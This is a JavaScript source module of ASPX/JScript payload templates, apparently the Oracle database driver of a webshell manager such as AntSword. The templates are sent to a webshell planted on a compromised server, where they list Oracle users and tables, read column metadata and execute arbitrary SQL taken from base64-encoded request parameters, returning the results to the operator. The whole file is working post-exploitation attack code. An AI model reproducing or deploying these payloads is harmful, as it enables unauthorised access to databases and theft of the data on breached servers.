/**
 * ASPX::oracle数据库驱动代码模板
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `var Conn=new ActiveXObject("Adodb.connection");
      Conn.ConnectionTimeout=10;
      Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));
      var Rs=new ActiveXObject("ADODB.Recordset");
      Rs.Open("SELECT USERNAME FROM ALL_USERS ORDER BY 1",Conn,1,1);
      while(!Rs.EOF && !Rs.BOF){
        Response.Write(Rs.Fields(0).Value+"\\t");
        Rs.MoveNext();
      }
      Rs.Close();
      Conn.Close();`.replace(/\n\s+/g, ''),
    // Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist
    // Security Info=True;
    'arg1': '#{base64::conn}'
  },
  // 显示数据库所有表
  show_tables: {
    _: `var Conn=new ActiveXObject("Adodb.connection");
      Conn.ConnectionString=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));
      Conn.ConnectionTimeout=10;
      Conn.Open();
      var Rs=new ActiveXObject("ADODB.Recordset");
      Rs.Open("SELECT TABLE_NAME FROM (SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='"+Request.Item["${arg2}"]+"' ORDER BY 1)",Conn,1,1);
      while(!Rs.EOF && !Rs.BOF){
        Response.Write(Rs.Fields(0).Value+"\\t");
        Rs.MoveNext();
      }
      Rs.Close();
      Conn.Close();`.replace(/\n\s+/g, ''),
    'arg1': '#{base64::conn}',
    'arg2': '#{dbname}'
  },
  // 显示表字段
  show_columns: {
    _: `var Conn=new ActiveXObject("Adodb.connection");
      Conn.ConnectionTimeout=10;
      Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));
      var Rs=new ActiveXObject("ADODB.Recordset");
      Rs.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"])),Conn,1,1);
      var CO:String="\\t";
      var i:Int32=Rs.Fields.Count,c:Int32;
      while(!Rs.EOF && !Rs.BOF){
        Response.Write(Rs.Fields(0).Value+" ("+Rs.Fields(1).Value+"("+Rs.Fields(2).Value+"))");
        Response.Write(CO);
        Rs.MoveNext();
      }
      Rs.Close();
      Conn.Close();`.replace(/\n\s+/g, ''),
    'arg1': '#{base64::conn}',
    // SELECT * FROM ${db}.${table} WHERE ROWNUM=0
    'arg2': '#{base64::table}' // 这里其实传入的是获取表头的 sql 语句
  },
  // 执行SQL语句
  query: {
    _: `var Conn=new ActiveXObject("Adodb.connection");
      var strSQL:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));
      Conn.ConnectionString=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));
      Conn.ConnectionTimeout=10;
      Conn.Open();
      var CO:String="\\t|\\t",RN:String="\\r\\n",Dat:String;
      var Rs=Conn.Execute(strSQL);
      var i:Int32=Rs.Fields.Count,c:Int32;
      for(c=0;c<i;c++){
        Response.Write(Rs.Fields(c).Name+CO);
      }
      Response.Write(RN);
      while(!Rs.EOF && !Rs.BOF){
        for(c=0;c<i;c++){
          Dat=Rs.Fields(c).Value;
          Response.Write(Dat);
          Response.Write(CO);
        }
        Response.Write(RN);
        Rs.MoveNext();
      }
      Conn.Close();`.replace(/\n\s+/g, ''),
    'arg1': '#{base64::conn}',
    // SELECT * FROM (SELECT A.*,ROWNUM N FROM table2 A ORDER BY 1) WHERE N>0 AND
    // N<=20
    'arg2': '#{base64::sql}',
    [arg3]: '#{dbname}'
  }
})